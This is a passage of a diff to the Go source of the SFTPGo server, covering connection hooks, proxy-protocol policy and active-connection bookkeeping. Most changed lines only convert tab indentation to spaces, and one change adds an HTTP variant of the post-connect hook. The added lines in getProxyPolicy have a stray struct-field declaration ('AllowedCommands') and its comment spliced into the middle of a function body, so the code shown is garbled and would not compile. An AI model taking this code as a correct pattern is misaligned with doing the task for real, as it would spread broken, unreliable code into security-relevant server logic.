getPermissionDeniedError(protocol)\n-\t\t}\n-\t\treturn nil\n-\t}\n-\tif !filepath.IsAbs(c.PostConnectHook) {\n-\t\terr := fmt.Errorf(\"invalid post connect hook %q\", c.PostConnectHook)\n-\t\tlogger.Warn(protocol, \"\", \"Login from ip %q denied: %v\", ipAddr, err)\n-\t\treturn getPermissionDeniedError(protocol)\n-\t}\n-\ttimeout, env, args := command.GetConfig(c.PostConnectHook, command.HookPostConnect)\n-\tctx, cancel := context.WithTimeout(context.Background(), timeout)\n-\tdefer cancel()\n-\n-\tcmd := exec.CommandContext(ctx, c.PostConnectHook, args...)\n-\tcmd.Env = append(env,\n-\t\tfmt.Sprintf(\"SFTPGO_CONNECTION_IP=%s\", ipAddr),\n-\t\tfmt.Sprintf(\"SFTPGO_CONNECTION_PROTOCOL=%s\", protocol))\n-\terr := cmd.Run()\n-\tif err != nil {\n-\t\tlogger.Warn(protocol, \"\", \"Login from ip %q denied, connect hook error: %v\", ipAddr, err)\n-\t\treturn getPermissionDeniedError(protocol)\n-\t}\n-\treturn nil\n+        if c.PostConnectHook == \"\" {\n+                return nil\n+        }\n+        if strings.HasPrefix(c.PostConnectHook, \"http\") {\n+                var url *url.URL\n+                url, err := url.Parse(c.PostConnectHook)\n+                if err != nil {\n+                        logger.Warn(protocol, \"\", \"Login from ip %q denied, invalid post connect hook %q: %v\",\n+                                ipAddr, c.PostConnectHook, err)\n+                        return getPermissionDeniedError(protocol)\n+                }\n+                q := url.Query()\n+                q.Add(\"ip\", ipAddr)\n+                q.Add(\"protocol\", protocol)\n+                url.RawQuery = q.Encode()\n+\n+                resp, err := httpclient.RetryableGet(url.String())\n+                if err != nil {\n+                        logger.Warn(protocol, \"\", \"Login from ip %q denied, error executing post connect hook: %v\", ipAddr, err)\n+                        return getPermissionDeniedError(protocol)\n+                }\n+                defer resp.Body.Close()\n+                if resp.StatusCode != http.StatusOK {\n+                        logger.Warn(protocol, \"\", \"Login from ip %q denied, post connect hook response code: %v\", ipAddr, resp.StatusCode)\n+                        return getPermissionDeniedError(protocol)\n+                }\n+                return nil\n+        }\n+        if !filepath.IsAbs(c.PostConnectHook) {\n+                err := fmt.Errorf(\"invalid post connect hook %q\", c.PostConnectHook)\n+                logger.Warn(protocol, \"\", \"Login from ip %q denied: %v\", ipAddr, err)\n+                return getPermissionDeniedError(protocol)\n+        }\n+        timeout, env, args := command.GetConfig(c.PostConnectHook, command.HookPostConnect)\n+        ctx, cancel := context.WithTimeout(context.Background(), timeout)\n+        defer cancel()\n+\n+        cmd := exec.CommandContext(ctx, c.PostConnectHook, args...)\n+        cmd.Env = append(env,\n+                fmt.Sprintf(\"SFTPGO_CONNECTION_IP=%s\", ipAddr),\n+                fmt.Sprintf(\"SFTPGO_CONNECTION_PROTOCOL=%s\", protocol))\n+        err := cmd.Run()\n+        if err != nil {\n+                logger.Warn(protocol, \"\", \"Login from ip %q denied, connect hook error: %v\", ipAddr, err)\n+                return getPermissionDeniedError(protocol)\n+        }\n+        return nil\n }\n \n func getProxyPolicy(allowed, skipped []func(net.IP) bool, def proxyproto.Policy) proxyproto.ConnPolicyFunc {\n-\treturn func(connPolicyOptions proxyproto.ConnPolicyOptions) (proxyproto.Policy, error) {\n-\t\tupstreamIP, err := util.GetIPFromNetAddr(connPolicyOptions.Upstream)\n-\t\tif err != nil {\n-\t\t\t// Something is wrong with the source IP, better reject the\n-\t\t\t// connection.\n-\t\t\tlogger.Error(logSender, \"\", \"reject connection from ip %q, err: %v\", connPolicyOptions.Upstream, err)\n-\t\t\treturn proxyproto.REJECT, proxyproto.ErrInvalidUpstream\n-\t\t}\n-\n-\t\tfor _, skippedFrom := range skipped {\n-\t\t\tif skippedFrom(upstreamIP) {\n-\t\t\t\treturn proxyproto.SKIP, nil\n-\t\t\t}\n-\t\t}\n-\n-\t\tfor _, allowFrom := range allowed {\n-\t\t\tif allowFrom(upstreamIP) {\n-\t\t\t\tif def == proxyproto.REQUIRE {\n-\t\t\t\t\treturn proxyproto.REQUIRE, nil\n-\t\t\t\t}\n-\t\t\t\treturn proxyproto.USE, nil\n-\t\t\t}\n-\t\t}\n-\n-\t\tif def == proxyproto.REQUIRE {\n-\t\t\tlogger.Debug(logSender, \"\", \"reject connection from ip %q: proxy protocol signature required and not set\",\n-\t\t\t\tupstreamIP)\n-\t\t\treturn proxyproto.REJECT, proxyproto.ErrInvalidUpstream\n-\t\t}\n-\t\treturn def, nil\n-\t}\n+        return func(connPolicyOptions proxyproto.ConnPolicyOptions) (proxyproto.Policy, error) {\n+                upstreamIP, err := util.GetIPFromNetAddr(connPolicyOptions.Upstream)\n+                if err != nil {\n+                        // Something is wrong with the source IP, better reject the\n+                        // connection.\n+                        logger.Error(logSender, \"\", \"reject connection from ip %q, err: %v\", connPolicyOptions.Upstream, err)\n+                        return proxyproto.REJECT, proxyproto.ErrInvalidUpstream\n+                }\n+\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[\"*\"]` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+                for _, skippedFrom := range skipped {\n+                        if skippedFrom(upstreamIP) {\n+                                return proxyproto.SKIP, nil\n+                        }\n+                }\n+\n+                for _, allowFrom := range allowed {\n+                        if allowFrom(upstreamIP) {\n+                                if def == proxyproto.REQUIRE {\n+                                        return proxyproto.REQUIRE, nil\n+                                }\n+                                return proxyproto.USE, nil\n+                        }\n+                }\n+\n+                if def == proxyproto.REQUIRE {\n+                        logger.Debug(logSender, \"\", \"reject connection from ip %q: proxy protocol signature required and not set\",\n+                                upstreamIP)\n+                        return proxyproto.REJECT, proxyproto.ErrInvalidUpstream\n+                }\n+                return def, nil\n+        }\n }\n \n // SSHConnection defines an ssh connection.\n // Each SSH connection can open several channels for SFTP or SSH commands\n type SSHConnection struct {\n-\tid           string\n-\tconn         net.Conn\n-\tlastActivity atomic.Int64\n+        id           string\n+        conn         net.Conn\n+        lastActivity atomic.Int64\n }\n \n // NewSSHConnection returns a new SSHConnection\n func NewSSHConnection(id string, conn net.Conn) *SSHConnection {\n-\tc := &SSHConnection{\n-\t\tid:   id,\n-\t\tconn: conn,\n-\t}\n-\tc.lastActivity.Store(time.Now().UnixNano())\n-\treturn c\n+        c := &SSHConnection{\n+                id:   id,\n+                conn: conn,\n+        }\n+        c.lastActivity.Store(time.Now().UnixNano())\n+        return c\n }\n \n // GetID returns the ID for this SSHConnection\n func (c *SSHConnection) GetID() string {\n-\treturn c.id\n+        return c.id\n }\n \n // UpdateLastActivity updates last activity for this connection\n func (c *SSHConnection) UpdateLastActivity() {\n-\tc.lastActivity.Store(time.Now().UnixNano())\n+        c.lastActivity.Store(time.Now().UnixNano())\n }\n \n // GetLastActivity returns the last connection activity\n func (c *SSHConnection) GetLastActivity() time.Time {\n-\treturn time.Unix(0, c.lastActivity.Load())\n+        return time.Unix(0, c.lastActivity.Load())\n }\n \n // Close closes the underlying network connection\n func (c *SSHConnection) Close() error {\n-\treturn c.conn.Close()\n+        return c.conn.Close()\n }\n \n // ActiveConnections holds the currect active connections with the associated transfers\n type ActiveConnections struct {\n-\t// clients contains both authenticated and estabilished connections and the ones waiting\n-\t// for authentication\n-\tclients clientsMap\n-\t// transfers contains active transfers, total and per-user\n-\ttransfers            clientsMap\n-\ttransfersCheckStatus atomic.Bool\n-\tsync.RWMutex\n-\tconnections    []ActiveConnection\n-\tmapping        map[string]int\n-\tsshConnections []*SSHConnection\n-\tsshMapping     map[string]int\n-\tperUserConns   map[string]int\n+        // clients contains both authenticated and estabilished connections and the ones waiting\n+        // for authentication\n+        clients clientsMap\n+        // transfers contains active transfers, total and per-user\n+        transfers            clientsMap\n+        transfersCheckStatus atomic.Bool\n+        sync.RWMutex\n+        connections    []ActiveConnection\n+        mapping        map[string]int\n+        sshConnections []*SSHConnection\n+        sshMapping     map[string]int\n+        perUserConns   map[string]int\n }\n \n // internal method, must be called within a locked block\n func (conns *ActiveConnections) addUserConnection(username string) {\n-\tif username == \"\" {\n-\t\treturn\n-\t}\n-\tconns.perUserConns[username]++\n+        if username == \"\" {\n+                return\n+        }\n+        conns.perUserConns[username]++\n }\n \n // internal method, must be called within a locked block\n func (conns *ActiveConnections) removeUserConnection(username string) {\n-\tif username == \"\" {\n-\t\treturn\n-\t}\n-\tif val, ok := conns.perUserConns[username]; ok {\n-\t\tconns.perUserConns[username]--\n-\t\tif val > 1 {\n-\t\t\treturn\n-\t\t}\n-\t\tdelete(conns.perUserConns, username)\n-\t}\n+        if username == \"\" {\n+                return\n+        }\n+        if val, ok := conns.perUserConns[username]; ok {\n+                conns.perUserConns[username]--\n+                if val > 1 {\n+                        return\n+                }\n+                delete(conns.perUserConns, username)\n+        }\n }\n \n // GetActiveSessions returns the number of active sessions for the given username.\n // We return the open sessions for any protocol\n func (conns *ActiveConnections) GetActiveSessions(username string) int {\n-\tconns.RLock()\n-\tdefer conns.RUnlock()\n+        conns.RLock()\n+        defer conns.RUnlock()\n \n-\treturn conns.perUserConns[username]\n+        return conns.perUserConns[username]\n }\n \n // Add adds a new connection to the active ones\n func (conns *ActiveConnections) Add(c ActiveConnection) error {\n-\tconns.Lock()\n-\tdefer conns.Unlock()\n-\n-\tif username := c.GetUsername(); username != \"\" {\n-\t\tif maxSessions := c.GetMaxSessions(); maxSessions > 0 {\n-\t\t\tif val := conns.perUserConns[username]; val >= maxSessions {\n-\t\t\t\treturn fmt.Errorf(\"too many open sessions: %d/%d\", val, maxSessions)\n-\t\t\t}\n-\t\t\tif val := conns.transfers.getTotalFrom(username); val >= maxSessions {\n-\t\t\t\treturn fmt.Errorf(\"too many open transfers: %d/%d\", val, maxSessions)\n-\t\t\t}\n-\t\t}\n-\t\tconns.addUserConnection(username)\n-\t}\n-\tconns.mapping[c.GetID()] = len(conns.connections)\n-\tconns.connections = append(conns.connections, c)\n-\tmetric.UpdateActiveConnectionsSize(len(conns.connections))\n-\tlogger.Debug(c.GetProtocol(), c.GetID(), \"connection added, local address %q, remote address %q, num open connections: %d\",\n-\t\tc.GetLocalAddress(), c.GetRemoteAddress(), len(conns.connections))\n-\treturn nil\n+        conns.Lock()\n+        defer conns.Unlock()\n+\n+        if username := c.GetUsername(); username != \"\" {\n+                if maxSessions := c.GetMaxSessions(); maxSessions > 0 {\n+                        if val := conns.perUserConns[username]; val >= maxSessions {\n+                                return fmt.Errorf(\"too many open sessions: %d/%d\", val, maxSessions)\n+                        }\n+                        if val := conns.transfers.getTotalFrom(username); val >= maxSessions {\n+                                return fmt.Errorf(\"too many open transfers: %d/%d\", val, maxSessions)\n+                        }\n+                }\n+                conns.addUserConnection(username)\n+        }\n+        conns.mapping[c.GetID()] = len(conns.connections)\n+        conns.connections = append(conns.connections, c)\n+        metric.UpdateActiveConnectionsSize(len(conns.connections))\n+        logger.Debug(c.GetProtocol(), c.GetID(), \"connection added, local address %q, remote address %q, num open connections: %d\",\n+                c.GetLocalAddress(), c.GetRemoteAddress(), len(conns.connections))\n+        return nil\n }\n \n // Swap replaces an existing connection with the given one.\n@@ -986,511 +1452,511 @@ func (conns *ActiveConnections) Add(c ActiveConnection) error {\n // for example for FTP is used to update the connection once the user\n // authenticates\n func (conns *ActiveConnections) Swap(c ActiveConnection) error {\n-\tconns.Lock()\n-\tdefer conns.Unlock()\n-\n-\tif idx, ok := conns.mapping[c.GetID()]; ok {\n-\t\tconn := conns.connections[idx]\n-\t\tconns.removeUserConnection(conn.GetUsername())\n-\t\tif username := c.GetUsername(); username != \"\" {\n-\t\t\tif maxSessions := c.GetMaxSessions(); maxSessions > 0 {\n-\t\t\t\tif val, ok := conns.perUserConns[username]; ok && val >= maxSessions {\n-\t\t\t\t\tconns.addUserConnection(conn.GetUsername())\n-\t\t\t\t\treturn fmt.Errorf(\"too many open sessions: %d/%d\", val, maxSessions)\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tconns.addUserConnection(username)\n-\t\t}\n-\t\terr := conn.CloseFS()\n-\t\tconns.connections[idx] = c\n-\t\tlogger.Debug(logSender, c.GetID(), \"connection swapped, close fs error: %v\", err)\n-\t\tconn = nil\n-\t\treturn nil\n-\t}\n-\n-\treturn errors.New(\"connection to swap not found\")\n+        conns.Lock()\n+        defer conns.Unlock()\n+\n+        if idx, ok := conns.mapping[c.GetID()]; ok {\n+                conn := conns.connections[idx]\n+                conns.removeUserConnection(conn.GetUsername())\n+                if username := c.GetUsername(); username != \"\" {\n+                        if maxSessions := c.GetMaxSessions(); maxSessions > 0 {\n+                                if val, ok := conns.perUserConns[username]; ok && val >= maxSessions {\n+                                        conns.addUserConnection(conn.GetUsername())\n+                                        return fmt.Errorf(\"too many open sessions: %d/%d\", val, maxSessions)\n+                                }\n+                        }\n+                        conns.addUserConnection(username)\n+                }\n+                err := conn.CloseFS()\n+                conns.connections[idx] = c\n+                logger.Debug(logSender, c.GetID(), \"connection swapped, close fs error: %v\", err)\n+                conn = nil\n+                return nil\n+        }\n+\n+        return errors.New(\"connection to swap not found\")\n }\n \n // Remove removes a connection from the active ones\n func (conns *ActiveConnections) Remove(connectionID string) {\n-\tconns.Lock()\n-\tdefer conns.Unlock()\n-\n-\tif idx, ok := conns.mapping[connectionID]; ok {\n-\t\tconn := conns.connections[idx]\n-\t\terr := conn.CloseFS()\n-\t\tlastIdx := len(conns.connections) - 1\n-\t\tconns.connections[idx] = conns.connections[lastIdx]\n-\t\tconns.connections[lastIdx] = nil\n-\t\tconns.connections = conns.connections[:lastIdx]\n-\t\tdelete(conns.mapping, connectionID)\n-\t\tif idx != lastIdx {\n-\t\t\tconns.mapping[conns.connections[idx].GetID()] = idx\n-\t\t}\n-\t\tconns.removeUserConnection(conn.GetUsername())\n-\t\tmetric.UpdateActiveConnectionsSize(lastIdx)\n-\t\tlogger.Debug(conn.GetProtocol(), conn.GetID(), \"connection removed, local address %q, remote address %q close fs error: %v, num open connections: %d\",\n-\t\t\tconn.GetLocalAddress(), conn.GetRemoteAddress(), err, lastIdx)\n-\t\tif conn.GetProtocol() == ProtocolFTP && conn.GetUsername() == \"\" && !slices.Contains(ftpLoginCommands, conn.GetCommand()) {\n-\t\t\tip := util.GetIPFromRemoteAddress(conn.GetRemoteAddress())\n-\t\t\tlogger.ConnectionFailedLog(\"\", ip, dataprovider.LoginMethodNoAuthTried, ProtocolFTP,\n-\t\t\t\tdataprovider.ErrNoAuthTried.Error())\n-\t\t\tmetric.AddNoAuthTried()\n-\t\t\tAddDefenderEvent(ip, ProtocolFTP, HostEventNoLoginTried)\n-\t\t\tdataprovider.ExecutePostLoginHook(&dataprovider.User{}, dataprovider.LoginMethodNoAuthTried, ip,\n-\t\t\t\tProtocolFTP, dataprovider.ErrNoAuthTried)\n-\t\t\tplugin.Handler.NotifyLogEvent(notifier.LogEventTypeNoLoginTried, ProtocolFTP, \"\", ip, \"\",\n-\t\t\t\tdataprovider.ErrNoAuthTried)\n-\t\t}\n-\t\tConfig.checkPostDisconnectHook(conn.GetRemoteAddress(), conn.GetProtocol(), conn.GetUsername(),\n-\t\t\tconn.GetID(), conn.GetConnectionTime())\n-\t\treturn\n-\t}\n-\n-\tlogger.Debug(logSender, \"\", \"connection id %q to remove not found!\", connectionID)\n+        conns.Lock()\n+        defer conns.Unlock()\n+\n+        if idx, ok := conns.mapping[connectionID]; ok {\n+                conn := conns.connections[idx]\n+                err := conn.CloseFS()\n+                lastIdx := len(conns.connections) - 1\n+                conns.connections[idx] = conns.connections[lastIdx]\n+                conns.connections[lastIdx] = nil\n+                conns.connections = conns.connections[:lastIdx]\n+                delete(conns.mapping, connectionID)\n+                if idx != lastIdx {\n+                        conns.mapping[conns.connections[idx].GetID()] = idx\n+                }\n+                conns.removeUserConnection(conn.GetUsername())\n+                metric.UpdateActiveConnectionsSize(lastIdx)\n+                logger.Debug(conn.GetProtocol(), conn.GetID(), \"connection removed, local address %q, remote address %q close fs error: %v, num open connections: %d\",\n+                        conn.GetLocalAddress(), conn.GetRemoteAddress(), err, lastIdx)\n+                if conn.GetProtocol() == ProtocolFTP && conn.GetUsername() == \"\" && !slices.Contains(ftpLoginCommands, conn.GetCommand()) {\n+                        ip := util.GetIPFromRemoteAddress(conn.GetRemoteAddress())\n+                        logger.ConnectionFailedLog(\"\", ip, dataprovider.LoginMethodNoAuthTried, ProtocolFTP,\n+                                dataprovider.ErrNoAuthTried.Error())\n+                        metric.AddNoAuthTried()\n+                        AddDefenderEvent(ip, ProtocolFTP, HostEventNoLoginTried)\n+                        dataprovider.ExecutePostLoginHook(&dataprovider.User{}, dataprovider.LoginMethodNoAuthTried, ip,\n+                                ProtocolFTP, dataprovider.ErrNoAuthTried)\n+                        plugin.Handler.NotifyLogEvent(notifier.LogEventTypeNoLoginTried, ProtocolFTP, \"\", ip, \"\",\n+                                dataprovider.ErrNoAuthTried)\n+                }\n+                Config.checkPostDisconnectHook(conn.GetRemoteAddress(), conn.GetProtocol(), conn.GetUsername(),\n+                        conn.GetID(), conn.GetConnectionTime())\n+                return\n+        }\n+\n+        logger.Debug(logSender, \"\", \"connection id %q to remove not found!\", connectionID)\n }\n \n // Close closes an active connection.\n // It returns true on success\n func (conns *ActiveConnections) Close(connectionID, role string) bool {\n-\tconns.RLock()\n+        conns.RLock()\n \n-\tvar result bool\n+        var result bool\n \n-\tif idx, ok := conns.mapping[connectionID]; ok {\n-\t\tc := conns.connections[idx]\n+        if idx, ok := conns.mapping[connectionID]; ok {\n+                c := conns.connections[idx]\n \n-\t\tif role == \"\" || c.GetRole() == role {\n-\t\t\tdefer func(conn ActiveConnection) {\n-\t\t\t\terr := conn.Disconnect()\n-\t\t\t\tlogger.Debug(conn.GetProtocol(), conn.GetID(), \"close connection requested, close err: %v\", err)\n-\t\t\t}(c)\n-\t\t\tresult = true\n-\t\t}\n-\t}\n+                if role == \"\" || c.GetRole() == role {\n+                        defer func(conn ActiveConnection) {\n+                                err := conn.Disconnect()\n+                                logger.Debug(conn.GetProtocol(), conn.GetID(), \"close connection requested, close err: %v\", err)\n+                        }(c)\n+                        result = true\n+                }\n+        }\n \n-\tconns.RUnlock()\n-\treturn result\n+        conns.RUnlock()\n+        return result\n }\n \n // AddSSHConnection adds a new ssh connection to the active ones\n func (conns *ActiveConnections) AddSSHConnection(c *SSHConnection) {\n-\tconns.Lock()\n-\tdefer conns.Unlock()\n+        conns.Lock()\n+        defer conns.Unlock()\n \n-\tconns.sshMapping[c.GetID()] = len(conns.sshConnections)\n-\tconns.sshConnections = append(conns.sshConnections, c)\n-\tlogger.Debug(logSender, c.GetID(), \"ssh connection added, num open connections: %d\", len(conns.sshConnections))\n+        conns.sshMapping[c.GetID()] = len(conns.sshConnections)\n+        conns.sshConnections = append(conns.sshConnections, c)\n+        logger.Debug(logSender, c.GetID(), \"ssh connection added, num open connections: %d\", len(conns.sshConnections))\n }\n \n // RemoveSSHConnection removes a connection from the active ones\n func (conns *ActiveConnections) RemoveSSHConnection(connectionID string) {\n-\tconns.Lock()\n-\tdefer conns.Unlock()\n-\n-\tif idx, ok := conns.sshMapping[connectionID]; ok {\n-\t\tlastIdx := len(conns.sshConnections) - 1\n-\t\tconns.sshConnections[idx] = conns.sshConnections[lastIdx]\n-\t\tconns.sshConnections[lastIdx] = nil\n-\t\tconns.sshConnections = conns.sshConnections[:lastIdx]\n-\t\tdelete(conns.sshMapping, connectionID)\n-\t\tif idx != lastIdx {\n-\t\t\tconns.sshMapping[conns.sshConnections[idx].GetID()] = idx\n-\t\t}\n-\t\tlogger.Debug(logSender, connectionID, \"ssh connection removed, num open ssh connections: %d\", lastIdx)\n-\t\treturn\n-\t}\n-\tlogger.Warn(logSender, \"\", \"ssh connection to remove with id %q not found!\", connectionID)\n+        conns.Lock()\n+        defer conns.Unlock()\n+\n+        if idx, ok := conns.sshMapping[connectionID]; ok {\n+                lastIdx := len(conns.sshConnections) - 1\n+                conns.sshConnections[idx] = conns.sshConnections[lastIdx]\n+                conns.sshConnections[lastIdx] = nil\n+                conns.sshConnections = conns.sshConnections[:lastIdx]\n+                delete(conns.sshMapping, connectionID)\n+                if idx != lastIdx {\n+                        conns.sshMapping[conns.sshConnections[idx].GetID()] = idx\n+                }\n+                logger.Debug(logSender, connectionID, \"ssh connection removed, num open ssh connections: %d\", lastIdx)\n+                return\n+        }\n+        logger.Warn(logSender, \"\", \"ssh connection to remove with id %q not found!\", connectionID)\n }\n \n func (conns *ActiveConnections) checkIdles() {\n-\tconns.RLock()\n-\n-\tfor _, sshConn := range conns.sshConnections {\n-\t\tidleTime := time.Since(sshConn.GetLastActivity())\n-\t\tif idleTime > Config.idleTimeoutAsDuration {\n-\t\t\t// we close an SSH connection if it has no active connections associated\n-\t\t\tidToMatch := fmt.Sprintf(\"_%s_\", sshConn.GetID())\n-\t\t\ttoClose := true\n-\t\t\tfor _, conn := range conns.connections {\n-\t\t\t\tif strings.Contains(conn.GetID(), idToMatch) {\n-\t\t\t\t\tif time.Since(conn.GetLastActivity()) <= Config.idleTimeoutAsDuration {\n-\t\t\t\t\t\ttoClose = false\n-\t\t\t\t\t\tbreak\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tif toClose {\n-\t\t\t\tdefer func(c *SSHConnection) {\n-\t\t\t\t\terr := c.Close()\n-\t\t\t\t\tlogger.Debug(logSender, c.GetID(), \"close idle SSH connection, idle time: %v, close err: %v\",\n-\t\t\t\t\t\ttime.Since(c.GetLastActivity()), err)\n-\t\t\t\t}(sshConn)\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tfor _, c := range conns.connections {\n-\t\tidleTime := time.Since(c.GetLastActivity())\n-\t\tisUnauthenticatedFTPUser := (c.GetProtocol() == ProtocolFTP && c.GetUsername() == \"\")\n-\n-\t\tif idleTime > Config.idleTimeoutAsDuration || (isUnauthenticatedFTPUser && idleTime > Config.idleLoginTimeout) {\n-\t\t\tdefer func(conn ActiveConnection) {\n-\t\t\t\terr := conn.Disconnect()\n-\t\t\t\tlogger.Debug(conn.GetProtocol(), conn.GetID(), \"close idle connection, idle time: %s, username: %q close err: %v\",\n-\t\t\t\t\ttime.Since(conn.GetLastActivity()), conn.GetUsername(), err)\n-\t\t\t}(c)\n-\t\t} else if !c.isAccessAllowed() {\n-\t\t\tdefer func(conn ActiveConnection) {\n-\t\t\t\terr := conn.Disconnect()\n-\t\t\t\tlogger.Info(conn.GetProtocol(), conn.GetID(), \"access conditions not met for user: %q close connection err: %v\",\n-\t\t\t\t\tconn.GetUsername(), err)\n-\t\t\t}(c)\n-\t\t}\n-\t}\n-\n-\tconns.RUnlock()\n+        conns.RLock()\n+\n+        for _, sshConn := range conns.sshConnections {\n+                idleTime := time.Since(sshConn.GetLastActivity())\n+                if idleTime > Config.idleTimeoutAsDuration {\n+                        // we close an SSH connection if it has no active connections associated\n+                        idToMatch := fmt.Sprintf(\"_%s_\", sshConn.GetID())\n+                        toClose := true\n+                        for _, conn := range conns.connections {\n+                                if strings.Contains(conn.GetID(), idToMatch) {\n+                                        if time.Since(conn.GetLastActivity()) <= Config.idleTimeoutAsDuration {\n+                                                toClose = false\n+                                                break\n+                                        }\n+                                }\n+                        }\n+                        if toClose {\n+                                defer func(c *SSHConnection) {\n+                                        err := c.Close()\n+                                        logger.Debug(logSender, c.GetID(), \"close idle SSH connection, idle time: %v, close err: %v\",\n+                                                time.Since(c.GetLastActivity()), err)\n+                                }(sshConn)\n+                        }\n+                }\n+        }\n+\n+        for _, c := range conns.connections {\n+                idleTime := time.Since(c.GetLastActivity())\n+                isUnauthenticatedFTPUser := (c.GetProtocol() == ProtocolFTP && c.GetUsername() == \"\")\n+\n+                if idleTime > Config.idleTimeoutAsDuration || (isUnauthenticatedFTPUser && idleTime > Config.idleLoginTimeout) {\n+                        defer func(conn ActiveConnection) {\n+                                err := conn.Disconnect()\n+                                logger.Debug(conn.GetProtocol(), conn.GetID(), \"close idle connection, idle time: %s, username: %q close err: %v\",\n+                                        time.Since(conn.GetLastActivity()), conn.GetUsername(), err)\n+                        }(c)\n+                } else if !c.isAccessAllowed() {\n+                        defer func(conn ActiveConnection) {\n+                                err := conn.Disconnect()\n+                                logger.Info(conn.GetProtocol(), conn.GetID(), \"access conditions not met for user: %q close connection err: %v\",\n+                                        conn.GetUsername(), err)\n+                        }(c)\n+                }\n+        }\n+\n+        conns.RUnlock()\n }\n \n func (conns *ActiveConnections) checkTransfers() {\n-\tif conns.transfersCheckStatus.Load() {\n-\t\tlogger.Warn(logSender, \"\", \"the previous transfer check is still running, skipping execution\")\n-\t\treturn\n-\t}\n-\tconns.transfersCheckStatus.Store(true)\n-\tdefer conns.transfersCheckStatus.Store(false)\n-\n-\tconns.RLock()\n-\n-\tif len(conns.connections) < 2 {\n-\t\tconns.RUnlock()\n-\t\treturn\n-\t}\n-\tvar wg sync.WaitGroup\n-\tlogger.Debug(logSender, \"\", \"start concurrent transfers check\")\n-\n-\t// update the current size for transfers to monitors\n-\tfor _, c := range conns.connections {\n-\t\tfor _, t := range c.GetTransfers() {\n-\t\t\tif t.HasSizeLimit {\n-\t\t\t\twg.Add(1)\n-\n-\t\t\t\tgo func(transfer ConnectionTransfer, connID string) {\n-\t\t\t\t\tdefer wg.Done()\n-\t\t\t\t\ttransfersChecker.UpdateTransferCurrentSizes(transfer.ULSize, transfer.DLSize, transfer.ID, connID)\n-\t\t\t\t}(t, c.GetID())\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tconns.RUnlock()\n-\tlogger.Debug(logSender, \"\", \"waiting for the update of the transfers current size\")\n-\twg.Wait()\n-\n-\tlogger.Debug(logSender, \"\", \"getting overquota transfers\")\n-\toverquotaTransfers := transfersChecker.GetOverquotaTransfers()\n-\tlogger.Debug(logSender, \"\", \"number of overquota transfers: %v\", len(overquotaTransfers))\n-\tif len(overquotaTransfers) == 0 {\n-\t\treturn\n-\t}\n-\n-\tconns.RLock()\n-\tdefer conns.RUnlock()\n-\n-\tfor _, c := range conns.connections {\n-\t\tfor _, overquotaTransfer := range overquotaTransfers {\n-\t\t\tif c.GetID() == overquotaTransfer.ConnID {\n-\t\t\t\tlogger.Info(logSender, c.GetID(), \"user %q is overquota, try to close transfer id %v\",\n-\t\t\t\t\tc.GetUsername(), overquotaTransfer.TransferID)\n-\t\t\t\tvar err error\n-\t\t\t\tif overquotaTransfer.TransferType == TransferDownload {\n-\t\t\t\t\terr = getReadQuotaExceededError(c.GetProtocol())\n-\t\t\t\t} else {\n-\t\t\t\t\terr = getQuotaExceededError(c.GetProtocol())\n-\t\t\t\t}\n-\t\t\t\tc.SignalTransferClose(overquotaTransfer.TransferID, err)\n-\t\t\t}\n-\t\t}\n-\t}\n-\tlogger.Debug(logSender, \"\", \"transfers check completed\")\n+        if conns.transfersCheckStatus.Load() {\n+                logger.Warn(logSender, \"\", \"the previous transfer check is still running, skipping execution\")\n+                return\n+        }\n+        conns.transfersCheckStatus.Store(true)\n+        defer conns.transfersCheckStatus.Store(false)\n+\n+        conns.RLock()\n+\n+        if len(conns.connections) < 2 {\n+                conns.RUnlock()\n+                return\n+        }\n+        var wg sync.WaitGroup\n+        logger.Debug(logSender, \"\", \"start concurrent transfers check\")\n+\n+        // update the current size for transfers to monitors\n+        for _, c := range conns.connections {\n+                for _, t := range c.GetTransfers() {\n+                        if t.HasSizeLimit {\n+                                wg.Add(1)\n+\n+                                go func(transfer ConnectionTransfer, connID string) {\n+                                        defer wg.Done()\n+                                        transfersChecker.UpdateTransferCurrentSizes(transfer.ULSize, transfer.DLSize, transfer.ID, connID)\n+                                }(t, c.GetID())\n+                        }\n+                }\n+        }\n+\n+        conns.RUnlock()\n+        logger.Debug(logSender, \"\", \"waiting for the update of the transfers current size\")\n+        wg.Wait()\n+\n+        logger.Debug(logSender, \"\", \"getting overquota transfers\")\n+        overquotaTransfers := transfersChecker.GetOverquotaTransfers()\n+        logger.Debug(logSender, \"\", \"number of overquota transfers: %v\", len(overquotaTransfers))\n+        if len(overquotaTransfers) == 0 {\n+                return\n+        }\n+\n+        conns.RLock()\n+        defer conns.RUnlock()\n+\n+        for _, c := range conns.connections {\n+                for _, overquotaTransfer := range overquotaTransfers {\n+                        if c.GetID() == overquotaTransfer.ConnID {\n+                                logger.Info(logSender, c.GetID(), \"user %q is overquota, try to close transfer id %v\",\n+                                        c.GetUsername(), overquotaTransfer.TransferID)\n+                                var err error\n+                                if overquotaTransfer.TransferType == TransferDownload {\n+                                        err = getReadQuotaExceededError(c.GetProtocol())\n+                                } else {\n+                                        err = getQuotaExceededError(c.GetProtocol())\n+                                }\n+                                c.SignalTransferClose(overquotaTransfer.TransferID, err)\n+                        }\n+                }\n+        }\n+        logger.Debug(logSender, \"\", \"transfers check completed\")\n }\n \n // AddClientConnection stores a new client connection\n func (conns *ActiveConnections) AddClientConnection(ipAddr string) {\n-\tconns.clients.add(ipAddr)\n+        conns.clients.add(ipAddr)\n }\n \n // RemoveClientConnection removes a disconnected client from the tracked ones\n func (conns *ActiveConnections) RemoveClientConnection(ipAddr string) {\n-\tconns.clients.remove(ipAddr)\n+        conns.clients.remove(ipAddr)\n }\n \n // GetClientConnections returns the total number of client connections\n func (conns *ActiveConnections) GetClientConnections() int32 {\n-\treturn conns.clients.getTotal()\n+        return conns.clients.getTotal()\n }\n \n // GetTotalTransfers returns the total number of active transfers\n func (conns *ActiveConnections) GetTotalTransfers() int32 {\n-\treturn conns.transfers.getTotal()\n+        return conns.transfers.getTotal()\n }\n \n // IsNewTransferAllowed returns an error if the maximum number of concurrent allowed\n // transfers is exceeded\n func (conns *ActiveConnections) IsNewTransferAllowed(username string) error 